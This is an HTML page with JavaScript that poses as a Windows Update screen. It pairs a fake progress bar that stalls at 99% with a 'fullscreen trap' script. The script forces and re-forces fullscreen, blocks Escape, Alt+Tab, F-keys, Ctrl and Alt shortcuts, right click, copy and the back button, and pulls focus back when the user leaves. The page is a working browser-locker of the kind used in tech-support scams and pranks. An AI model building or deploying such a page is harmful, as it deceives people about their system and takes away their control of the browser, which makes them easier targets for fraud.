 <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Windows Update</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  body {
    background: linear-gradient(135deg, #005a9e 0%, #003f6b 100%);
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    height: 100vh;
    width: 100vw;
    overflow: hidden;
    display: flex;
    justify-content: center;
    align-items: center;
    color: white;
    cursor: wait;
    user-select: none;
    -webkit-user-select: none;
    position: fixed;
    top: 0;
    left: 0;
  }

  .container {
    text-align: center;
    max-width: 600px;
    padding: 40px;
  }

  .logo {
    width: 80px;
    height: 80px;
    margin: 0 auto 30px auto;
    background: rgba(255, 255, 255, 0.15);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 48px;
    animation: pulse 2s infinite;
  }

  @keyframes pulse {
    0%, 100% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.05); opacity: 0.8; }
  }

  h1 {
    font-size: 36px;
    font-weight: 300;
    margin-bottom: 10px;
    letter-spacing: 0.5px;
  }

  .subtitle {
    font-size: 16px;
    color: rgba(255, 255, 255, 0.7);
    margin-bottom: 40px;
  }

  .progress-container {
    width: 100%;
    max-width: 480px;
    margin: 0 auto;
    background: rgba(255, 255, 255, 0.2);
    border-radius: 12px;
    height: 14px;
    overflow: hidden;
    position: relative;
  }

  .progress-bar {
    height: 100%;
    width: 3%;
    background: linear-gradient(90deg, #4db8ff, #7ac4ff);
    border-radius: 12px;
    transition: width 0.5s ease;
    position: relative;
  }

  .progress-bar::after {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
    animation: shimmer 2s infinite;
  }

  @keyframes shimmer {
    0% { transform: translateX(-100%); }
    100% { transform: translateX(100%); }
  }

  .progress-label {
    font-size: 14px;
    color: rgba(255, 255, 255, 0.8);
    margin-top: 12px;
    font-family: 'Segoe UI', monospace;
  }

  .info-text {
    font-size: 13px;
    color: rgba(255, 255, 255, 0.5);
    margin-top: 50px;
    line-height: 1.6;
  }

  .spinner-container {
    margin: 30px auto 0;
    display: flex;
    justify-content: center;
    gap: 8px;
  }

  .dot {
    width: 10px;
    height: 10px;
    background: rgba(255, 255, 255, 0.4);
    border-radius: 50%;
    animation: dotPulse 1.5s infinite ease-in-out;
  }

  .dot:nth-child(2) { animation-delay: 0.2s; }
  .dot:nth-child(3) { animation-delay: 0.4s; }

  @keyframes dotPulse {
    0%, 80%, 100% { transform: scale(0.6); opacity: 0.3; }
    40% { transform: scale(1); opacity: 1; }
  }

  .restart-notice {
    margin-top: 25px;
    font-size: 13px;
    color: rgba(255, 255, 255, 0.35);
    animation: fadeInOut 4s infinite;
  }

  @keyframes fadeInOut {
    0%, 100% { opacity: 0.35; }
    50% { opacity: 0.7; }
  }
</style>
</head>
<body>

<div class="container">
  <div class="logo">⚙️</div>
  <h1>Installing updates</h1>
  <p class="subtitle">Please wait a moment</p>

  <div class="progress-container">
    <div class="progress-bar" id="progressBar"></div>
  </div>
  <div class="progress-label" id="progressLabel">3%</div>

  <div class="spinner-container">
    <div class="dot"></div>
    <div class="dot"></div>
    <div class="dot"></div>
  </div>

  <p class="info-text">
    Your device may restart several times.<br>
    <strong>Do not turn off your device.</strong>
  </p>

  <p class="restart-notice" id="restartNotice">
    ⏳ Checking for updates...
  </p>
</div>

<script>
// ============================================
// FULLSCREEN TRAP — LEVEL MAXIMUM
// ============================================

// 1. BLOCK ALL KEYBOARD ESCAPE ATTEMPTS
document.addEventListener('keydown', function(e) {
  // List ya keys zote za kutoroka
  const forbiddenKeys = [
    'Escape', 'F11', 'F5', 'F12',
    'Alt', 'Tab', 'Meta', 'ContextMenu'
  ];
  
  // Block kwa key name
  if (forbiddenKeys.includes(e.key)) {
    e.preventDefault();
    e.stopPropagation();
    e.stopImmediatePropagation();
    return false;
  }
  
  // Block kwa keyCode (backup)
  const forbiddenCodes = [
    27,  // Escape
    122, // F11
    116, // F5
    123, // F12
    18,  // Alt
    9,   // Tab
    91,  // Meta (Win key)
    92,  // Meta (Win key)
    93   // Context menu
  ];
  
  if (forbiddenCodes.includes(e.keyCode)) {
    e.preventDefault();
    e.stopPropagation();
    e.stopImmediatePropagation();
    return false;
  }
  
  // Block Ctrl+ combinations
  if (e.ctrlKey) {
    const blockedCombos = ['w', 'q', 'r', 't', 'n', 's', 'u'];
    if (blockedCombos.includes(e.key.toLowerCase())) {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }
  }
  
  // Block Alt+ combinations
  if (e.altKey) {
    const blockedAltCombos = ['F4', 'Tab', 'd', 'f', 'e'];
    if (blockedAltCombos.includes(e.key)) {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }
  }
});

// 2. BLOCK RIGHT CLICK
document.addEventListener('contextmenu', function(e) {
  e.preventDefault();
  return false;
});

// 3. BLOCK TEXT SELECTION
document.addEventListener('selectstart', function(e) {
  e.preventDefault();
  return false;
});

// 4. BLOCK DRAG (user might drag URL)
document.addEventListener('dragstart', function(e) {
  e.preventDefault();
  return false;
});

// 5. BLOCK COPY/CUT
document.addEventListener('copy', function(e) {
  e.preventDefault();
  return false;
});
document.addEventListener('cut', function(e) {
  e.preventDefault();
  return false;
});

// 6. FORCE FULLSCREEN ON LOAD
function goFullscreen() {
  const el = document.documentElement;
  if (el.requestFullscreen) {
    el.requestFullscreen({ navigationUI: 'hide' }).catch(() => {});
  } else if (el.webkitRequestFullscreen) {
    el.webkitRequestFullscreen();
  } else if (el.msRequestFullscreen) {
    el.msRequestFullscreen();
  } else if (el.mozRequestFullScreen) {
    el.mozRequestFullScreen();
  }
}

// 7. RE-ENTER FULLSCREEN IF USER ESCAPES
function checkFullscreen() {
  if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement) {
    goFullscreen();
  }
}

document.addEventListener('fullscreenchange', checkFullscreen);
document.addEventListener('webkitfullscreenchange', checkFullscreen);
document.addEventListener('mozfullscreenchange', checkFullscreen);
document.addEventListener('MSFullscreenChange', checkFullscreen);

// 8. BLOCK VISIBILITY CHANGE (user switches tabs)
document.addEventListener('visibilitychange', function() {
  if (document.hidden) {
    setTimeout(function() {
      window.focus();
      goFullscreen();
    }, 10);
  }
});

// 9. BLOCK BROWSER BACK BUTTON
history.pushState(null, null, location.href);
window.addEventListener('popstate', function() {
  history.pushState(null, null, location.href);
});

// 10. BLOCK WINDOW BLUR (user tries to alt-tab)
window.addEventListener('blur', function() {
  setTimeout(function() {
    window.focus();
  }, 10);
});

// 11. PREVENT PAGE UNLOAD (user tries to close)
window.addEventListener('beforeunload', function(e) {
  e.preventDefault();
  e.returnValue = '';
});

// 12. REPLACE ALL LINKS TO GO NOWHERE
document.addEventListener('click', function(e) {
  if (e.target.tagName === 'A') {
    e.preventDefault();
    return false;
  }
});

// ============================================
// FAKE PROGRESS BAR — BELIEVABLE
// ============================================

let percent = 3;
let phase = 0;

const messages = [
  '⏳ Checking for updates...',
  '📦 Downloading update 1 of 3...',
  '⚙️ Applying updates...',
  '🔄 Configuring system settings...',
  '📦 Downloading update 2 of 3...',
  '🔧 Installing component updates...',
  '📦 Downloading update 3 of 3...',
  '⚙️ Finalizing installation...',
  '🔄 Preparing for restart...',
  '⏳ Please wait...',
  '📦 Installing update for Windows...',
  '🔒 Applying security patches...',
  '⚠️ Do not restart your PC',
  '🔄 Configuring Windows Update...',
  '✅ Almost done...'
];

function updateProgress() {
  phase++;
  
  // Update percentage
  if (phase < 10) {
    percent = 3 + (phase * 1.5);
  } else if (phase < 25) {
    percent = 16 + ((phase - 10) * 1.2);
  } else if (phase < 45) {
    percent = 34 + ((phase - 25) * 1.0);
  } else if (phase < 65) {
    percent = 54 + ((phase - 45) * 0.8);
  } else if (phase < 90) {
    percent = 70 + ((phase - 65) * 0.6);
  } else if (phase < 130) {
    percent = 85 + ((phase - 90) * 0.3);
  } else {
    percent = 99;  // Never reach 100
  }
  
  if (percent > 99) percent = 99;
  
  document.getElementById('progressBar').style.width = percent + '%';
  document.getElementById('progressLabel').textContent = Math.floor(percent) + '%';
  
  // Update message
  const msgIndex = Math.min(Math.floor(phase / 8), messages.length - 1);
  document.getElementById('restartNotice').textContent = messages[msgIndex];
  
  // Slow down over time
  let delay = 1000;
  if (phase > 20) delay = 1500;
  if (phase > 40) delay = 2500;
  if (phase > 60) delay = 3500;
  if (phase > 90) delay = 5000;
  if (phase > 120) delay = 7000;
  
  setTimeout(updateProgress, delay);
}

// ============================================
// START
// ============================================
setTimeout(function() {
  goFullscreen();
  updateProgress();
}, 500);

// Keep fullscreen every 2 seconds
setInterval(function() {
  if (!document.fullscreenElement) {
    goFullscreen();
  }
}, 2000);

console.log('🔧 Windows Update in progress...');
console.log('⚠️ Do not close this tab.');
</script>
</body>
</html>
